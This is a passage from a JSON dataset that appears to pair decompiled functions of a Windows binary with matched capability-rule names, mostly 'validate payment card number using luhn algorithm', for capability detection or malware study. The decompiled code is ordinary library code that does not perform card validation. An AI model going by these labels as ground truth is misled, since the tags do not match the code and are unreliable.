            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nvoid __fastcall fcn.00406136(code **param_1)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *param_1 = vtable.std::ctype_char_.0;\n    fcn.00406929(param_1);\n    fcn.00401091();\n    return;\n}\n",
        "token_count": 86
    },
    "0040620d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040620d(int32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    *in_ECX = arg_8h;\n    if (arg_8h == 0) {\n        fcn.004023ab();\n    }\n    else if (arg_8h < 8) {\n        fcn.004046a1(arg_8h * 0x18 + 0x574128);\n    }\n    return;\n}\n",
        "token_count": 106
    },
    "00406235": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406235(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    *(param_1 + 1) = 0;\n    return;\n}\n",
        "token_count": 51
    },
    "00406249": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00406249(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040178a(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "00406271": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406271(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    fcn.00404ce1(arg_8h, arg_10h & 0xffff, arg_ch);\n    return;\n}\n",
        "token_count": 58
    },
    "0040628f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint __cdecl fcn.0040628f(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403b02(0x446);\n    return 0x14c38;\n}\n",
        "token_count": 72
    },
    "00406294": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406294(uint *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n        fcn.00401dd4(*arg_ch);\n    }\n    *arg_8h = arg_14h;\n    arg_8h[1] = arg_18h;\n    return;\n}\n",
        "token_count": 111
    },
    "0040629e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040629e(int32_t *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040409d(arg_ch);\n    *arg_8h = iVar1;\n    return (-(iVar1 != 0) & 0xfffffff4) + 0xc;\n}\n",
        "token_count": 82
    },
    "004062a3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004062a3(uint arg_8h)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00405bdc(arg_8h);\n    return arg_8h;\n}\n",
        "token_count": 54
    },
    "004062d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.004062d0(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00402b26();\n    return iVar1 + 0x14;\n}\n",
        "token_count": 45
    },
    "004062e9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar * fcn.004062e9(uint32_t *param_1)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint32_t *puVar3;\n    uint32_t *puVar4;\n    \n    uVar2 = param_1 & 3;\n    puVar3 = param_1;\n    while (uVar2 != 0) {\n        cVar1 = *puVar3;\n        puVar3 = puVar3 + 1;\n        if (cVar1 == '\\0') goto code_r0x00494583;\n        uVar2 = puVar3 & 3;\n    }\n    do {\n        do {\n            puVar4 = puVar3;\n            puVar3 = puVar4 + 1;\n        } while (((*puVar4 ^ 0xffffffff ^ *puVar4 + 0x7efefeff) & 0x81010100) == 0);\n        uVar2 = *puVar4;\n        if (uVar2 == '\\0') {\n            return puVar4 - param_1;\n        }\n        if (uVar2 >> 8 == '\\0') {\n            return puVar4 + (1 - param_1);\n        }\n        if ((uVar2 & 0xff0000) == 0) {\n            return puVar4 + (2 - param_1);\n        }\n    } while ((uVar2 & 0xff000000) != 0);\ncode_r0x00494583:\n    return puVar3 + (-1 - param_1);\n}\n",
        "token_count": 339
    },
    "0040630c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040630c(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *in_ECX;\n    uint32_t uVar3;\n    uint var_4h;\n    \n    uVar1 = arg_8h[4];\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    if (uVar1 < 8) {\n        *in_ECX = *arg_8h;\n        in_ECX[1] = arg_8h[1];\n        in_ECX[2] = arg_8h[2];\n        in_ECX[3] = arg_8h[3];\n        uVar3 = 7;\n    }\n    else {\n        uVar3 = 0x7ffffffe;\n        if ((uVar1 | 7) < 0x7fffffff) {\n            uVar3 = uVar1 | 7;\n        }\n        uVar2 = fcn.00404480(uVar3 + 1);\n        *in_ECX = uVar2;\n        fcn.00405830(uVar2, arg_8h, uVar1 * 2 + 2);\n    }\n    in_ECX[4] = uVar1;\n    in_ECX[5] = uVar3;\n    return;\n}\n",
        "token_count": 304
    },
    "0040638e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040638e(code **param_1)\n\n{\n    int32_t *in_FS_OFFSET;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    var_14h = 0x426f00;\n    var_18h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_18h;\n    *param_1 = vtable.std::exception.0;\n    var_10h = 0;\n    fcn.00405b32(param_1 + 1);\n    *in_FS_OFFSET = var_18h;\n    return;\n}\n",
        "token_count": 154
    },
    "00406401": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406401(uint arg_8h, uint *arg_ch)\n\n{\n    code **in_ECX;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    fcn.00405fd3(*arg_ch, arg_ch[1], arg_8h);\n    *in_ECX = vtable.std::ios_base::failure.0;\n    return;\n}\n",
        "token_count": 99
    },
    "0040641a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040641a(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.004012df(param_1);\n    return;\n}\n",
        "token_count": 56
    },
    "0040645b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040645b(int32_t param_1)\n\n{\n    fcn.00404179(*(param_1 + 8));\n    fcn.00404179(*(param_1 + 0x10));\n    fcn.00404179(*(param_1 + 0x14));\n    return;\n}\n",
        "token_count": 72
    },
    "00406460": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406460(uint arg_8h, uint arg_ch)\n\n{\n    fcn.004b43fa(arg_8h, arg_ch, 0);\n    return;\n}\n",
        "token_count": 44
    },
    "0040646f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040646f(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_4h;\n    \n    iVar1 = fcn.00404c64();\n    if (iVar1 != 0) {\n        uVar2 = fcn.0040386e(&arg_8h, 1, &var_4h);\n        if (uVar2 != 0) {\n            return uVar2 & 0xffff0000 | arg_8h & 0xffff;\n        }\n    }\n    return 0xffff;\n}\n",
        "token_count": 137
    },
    "00406479": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406479(uint arg_8h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    \n    piVar1 = fcn.00406645();\n    uVar2 = fcn.004035e9();\n    (**(*piVar1 + 8))(arg_8h, uVar2);\n    return arg_8h;\n}\n",
        "token_count": 111
    },
    "004064a6": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004064a6(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint var_4h;\n    \n    iVar1 = fcn.00403c9c(arg_8h, arg_8h + 0x1c, &arg_ch);\n    return iVar1 - arg_8h >> 1;\n}\n",
        "token_count": 87
    },
    "004064b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.004064b0(int32_t *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint var_20h;\n    uint var_18h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    piVar2 = fcn.0040295a(&var_8h, 1, 0);\n    iVar3 = *piVar2;\n    *arg_8h = iVar3;\n    iVar1 = piVar2[1];\n    arg_8h[1] = iVar1;\n    if ((iVar1 == '\\0') && (**0x574458 != '\\0')) {\n        if (**0x574458 == '@') goto code_r0x004918e8;\n        var_8h = 0x555750;\n        var_4h = 2;\n        fcn.00403a80(&var_10h);\n        fcn.00405164(&var_18h, &var_8h);\n        piVar2 = fcn.004053b7(&var_20h, arg_8h);\n        iVar3 = *piVar2;\n        *arg_8h = iVar3;\n        arg_8h[1] = piVar2[1];\n    }\n    if (**0x574458 != '@') {\n        if (**0x574458 != '\\0') {\n            arg_8h[1] = 0;\n            *(arg_8h + 1) = 2;\n            *arg_8h = 0;\n            return arg_8h;\n        }\n        if (iVar3 == 0) {\n            fcn.00402eb9(1);\n            return arg_8h;\n        }\n        var_8h = 0x555750;\n        var_4h = 2;\n        fcn.004017df(1);\n        fcn.00405164(&var_18h, &var_8h);\n        piVar2 = fcn.004053b7(&var_10h, arg_8h);\n        *arg_8h = *piVar2;\n        arg_8h[1] = piVar2[1];\n        return arg_8h;\n    }\ncode_r0x004918e8:\n    *0x574458 = *0x574458 + 1;\n    return arg_8h;\n}\n",
        "token_count": 563
    },
    "004064c9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004064c9(uint32_t arg_8h, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_ch;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_ECX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = in_ECX[4];\n    if (arg_8h <= 0x7ffffffeU - iVar1) {\n        arg_ch = in_ECX[5];\n        iVar3 = fcn.004035b7(iVar1 + arg_8h, arg_ch, 0x7ffffffe);\n        iVar4 = fcn.00404480(iVar3 + 1);\n        in_ECX[5] = iVar3;\n        in_ECX[4] = iVar1 + arg_8h;\n        if (arg_ch < 8) {\n            fcn.00405830(iVar4);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n        }\n        else {\n            iVar3 = *in_ECX;\n            fcn.00405830(iVar4, iVar3, iVar1 * 2);\n            *(iVar1 * 2 + iVar4) = arg_10h;\n            *(iVar1 * 2 + 2 + iVar4) = 0;\n            fcn.00401654(iVar3, arg_ch * 2 + 2);\n        }\n        *in_ECX = iVar4;\n        return;\n    }\n    fcn.0040393b();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 400
    },
    "00406505": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406505(int32_t lpCriticalSection)\n\n{\n    (*_sym.imp.KERNEL32.dll_EnterCriticalSection)(lpCriticalSection * 0x18 + 0x575068);\n    return;\n}\n",
        "token_count": 47
    },
    "00406564": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.00406564(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.00403553(param_1);\n    return;\n}\n",
        "token_count": 55
    },
    "004065be": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004065be(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint8_t *puVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    puVar2 = *(in_ECX + 0x34);\n    if (0 < arg_8h) {\n        do {\n            if (*puVar2 == 0) {\n                return iVar3;\n            }\n            iVar1 = fcn.00406203(***(in_ECX + 8), *puVar2, 0x8000);\n            if (iVar1 != 0) {\n                puVar2 = puVar2 + 1;\n            }\n            puVar2 = puVar2 + 1;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < arg_8h);\n    }\n    return iVar3;\n}\n",
        "token_count": 203
    },
    "00406636": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406636(uint *arg_8h)\n\n{\n    *arg_8h = 0;\n    arg_8h[1] = 0;\n    arg_8h[2] = 0;\n    arg_8h[4] = 0xffffffff;\n    arg_8h[5] = 0;\n    arg_8h[6] = 0;\n    arg_8h[7] = 0;\n    arg_8h[3] = 0;\n    return;\n}\n",
        "token_count": 117
    },
    "00406645": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406645(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 4);\n}\n",
        "token_count": 37
    },
    "0040664a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040664a(uint32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    uint32_t in_stack_ffffffdc;\n    uint var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    uint var_ch;\n    int32_t var_bp_8h;\n    \n    if (arg_8h < *(in_ECX + 0x14) || arg_8h == *(in_ECX + 0x14)) {\n        var_10h = fcn.00406087();\n        *(in_ECX + 0x10) = arg_8h;\n        fcn.0040146f(var_10h, arg_8h, arg_ch);\n        var_14h._3_1_ = 0;\n        fcn.00405e0c(var_10h + arg_8h, &var_14h + 3);\n        var_bp_8h = in_ECX;\n    }\n    else {\n        var_bp_8h = fcn.00403607(arg_8h, in_stack_ffffffdc & 0xffffff00 | var_14h, arg_ch);\n    }\n    return var_bp_8h;\n}\n",
        "token_count": 285
    },
    "00406681": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00406681(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    param_1[1] = 0;\n    return;\n}\n",
        "token_count": 49
    },
    "004066a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004066a9(int32_t arg_8h)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    \n    iVar3 = fcn.00402b26();\n    if (arg_8h == *(iVar3 + 0x24)) {\n        uVar1 = *(arg_8h + 4);\n        iVar3 = fcn.00402b26();\n        *(iVar3 + 0x24) = uVar1;\n    }\n    else {\n        iVar3 = fcn.00402b26();\n        iVar3 = *(iVar3 + 0x24);\n        do {\n            piVar4 = iVar3 + 4;\n            iVar3 = *piVar4;\n            if (iVar3 == 0) {\n                fcn.00404f39();\n                pcVar2 = swi(3);\n                (*pcVar2)();\n                return;\n            }\n        } while (arg_8h != iVar3);\n        *piVar4 = *(arg_8h + 4);\n    }\n    return;\n}\n",
        "token_count": 247
    },
    "00406712": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406712(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    code **in_ECX;\n    \n    pcVar1 = *in_ECX;\n    (**0x578000)(arg_8h + 7U & 0xfffffff8);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 76
    },
    "00406753": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00406753(uint param_1, uint param_2, ulong param_3, ulong param_4, ulong param_5, uint param_6)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint arg_8h;\n    uint in_stack_ffffff68;\n    uchar auStack144 [48];\n    ulong uStack96;\n    uint32_t uStack80;\n    uint32_t uStack20;\n    \n    arg_8h = param_6;\n    uStack20 = *0x571ca8 ^ &stack0xfffffff0;\n    iVar2 = fcn.00402f6d(param_1, &param_5, param_6);\n    if (iVar2 == 0) {\n        uStack80 = uStack80 & 0xffffffe3 | 3;\n        uStack96 = param_4;\n        fcn.004055b0(auStack144, &param_6, param_1, param_2, &param_3, &param_5, 0);\n        arg_8h = param_6;\n    }\n    iVar2 = fcn.0040559c(param_1);\n    cVar1 = fcn.00404903();\n    if ((cVar1 == '\\0') || (iVar2 == 0)) {\n        fcn.00403d8c(iVar2);\n        fcn.0040524f(arg_8h, 0xffff);\n    }\n    else {\n        fcn.004045de(iVar2, param_2, param_3, param_3 >> 0x20, param_4, param_4 >> 0x20, param_5, param_5 >> 0x20, \n                     arg_8h);\n    }\n    fcn.004030bc(in_stack_ffffff68);\n    return;\n}\n",
        "token_count": 401
    },
    "00406799": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406799(uint arg_8h)\n\n{\n    fcn.004062df(0, arg_8h, 0, 10, 1);\n    return;\n}\n",
        "token_count": 45
    },
    "004067ad": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004067ad(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    \n    iVar2 = fcn.00405b64(*(in_ECX + 8) + 0x250, 0x55, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        fcn.00405d49(arg_8h, arg_ch);\n        return;\n    }\n    fcn.0040366b(0, 0, 0, 0, 0);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 156
    },
    "004067c1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004067c1(uint *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    return;\n}\n",
        "token_count": 39
    },
    "004067d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004067d5(void)\n\n{\n    fcn.004aa9f4(0, 0, 1);\n    return;\n}\n",
        "token_count": 34
    },
    "00406811": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00406811(uint param_1)\n\n{\n    uint var_4h;\n    \n    return param_1;\n}\n",
        "token_count": 31
    },
    "0040687a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040687a(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040638e(param_1);\n    return;\n}\n",
        "token_count": 57
    },
    "004068de": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004068de(int32_t param_1)\n\n{\n    uint var_4h;\n    \n    return *(param_1 + 0x10);\n}\n",
        "token_count": 39
    },
    "00406910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406910(int32_t arg_8h, int32_t arg_ch, uint arg_10h)\n\n{\n    uchar var_5h;\n    uint var_4h;\n    \n    fcn.0040146f(arg_8h, arg_ch, arg_10h);\n    var_5h = 0;\n    fcn.00405e0c(arg_8h + arg_ch, &var_5h);\n    return;\n}\n",
        "token_count": 103
    },
    "00406947": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406947(uint *arg_8h, uint16_t *arg_ch, uint16_t *arg_10h, uint arg_14h, uint arg_18h)\n\n{\n    for (; arg_ch != arg_10h; arg_ch = arg_ch + 1) {\n        fcn.00406488(*arg_ch);\n    }\n    *arg_8h = arg_14h;\n    arg_8h[1] = arg_18h;\n    return;\n}\n",
        "token_count": 110
    },
    "0040694c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040694c(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 24
    },
    "0040695b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040695b(uint32_t arg_8h, uint arg_ch)\n\n{\n    uint *in_ECX;\n    uint *arg_8h_00;\n    uint var_4h;\n    \n    if (arg_8h < in_ECX[5] || arg_8h == in_ECX[5]) {\n        arg_8h_00 = in_ECX;\n        if (7 < in_ECX[5]) {\n            arg_8h_00 = *in_ECX;\n        }\n        in_ECX[4] = arg_8h;\n        fcn.00404ce1(arg_8h_00, arg_ch, arg_8h);\n        *(arg_8h_00 + arg_8h * 2) = 0;\n    }\n    else {\n        fcn.0040388c(arg_8h, in_ECX, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 203
    },
    "0040696a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuchar * __cdecl fcn.0040696a(uint noname_0, uchar *arg_ch, char *arg_10h, uint32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    char *pcVar2;\n    ushort *puVar3;\n    \n    *arg_ch = 0x25;\n    pcVar2 = arg_ch + 1;\n    if ((arg_14h & 0x20) != 0) {\n        *pcVar2 = '+';\n        pcVar2 = arg_ch + 2;\n    }\n    if ((arg_14h & 8) != 0) {\n        *pcVar2 = '#';\n        pcVar2 = pcVar2 + 1;\n    }\n    puVar3 = pcVar2 + 1;\n    if (*arg_10h == 'L') {\n        *pcVar2 = 'I';\n        *puVar3 = 0x3436;\n        puVar3 = pcVar2 + 3;\n    }\n    else {\n        *pcVar2 = *arg_10h;\n    }\n    if ((arg_14h & 0xe00) == 0x400) {\n        uVar1 = 0x6f;\n    }\n    else if ((arg_14h & 0xe00) == 0x800) {\n        uVar1 = ~(arg_14h << 3) & 0x20U | 0x58;\n    }\n    else {\n        uVar1 = arg_10h[1];\n    }\n    *puVar3 = uVar1;\n    *(puVar3 + 1) = 0;\n    return arg_ch;\n}\n",
        "token_count": 364
    },
    "00406997": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406997(int32_t arg_8h)\n\n{\n    if (arg_8h != 0) {\n        fcn.004ccf4a(arg_8h, 7);\n        fcn.004ccf4a(arg_8h + 0x1c, 7);\n        fcn.004ccf4a(arg_8h + 0x38, 0xc);\n        fcn.004ccf4a(arg_8h + 0x68, 0xc);\n        fcn.004ccf4a(arg_8h + 0x98, 2);\n        fcn.0040640b(*(arg_8h + 0xa0));\n        fcn.0040640b(*(arg_8h + 0xa4));\n        fcn.0040640b(*(arg_8h + 0xa8));\n        fcn.004ccf4a(arg_8h + 0xb4, 7);\n        fcn.004ccf4a(arg_8h + 0xd0, 7);\n        fcn.004ccf4a(arg_8h + 0xec, 0xc);\n        fcn.004ccf4a(arg_8h + 0x11c, 0xc);\n        fcn.004ccf4a(arg_8h + 0x14c, 2);\n        fcn.0040640b(*(arg_8h + 0x154));\n        fcn.0040640b(*(arg_8h + 0x158));\n        fcn.0040640b(*(arg_8h + 0x15c));\n        fcn.0040640b(*(arg_8h + 0x160));\n    }\n    return;\n}\n",
        "token_count": 392
    },
    "004892a9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
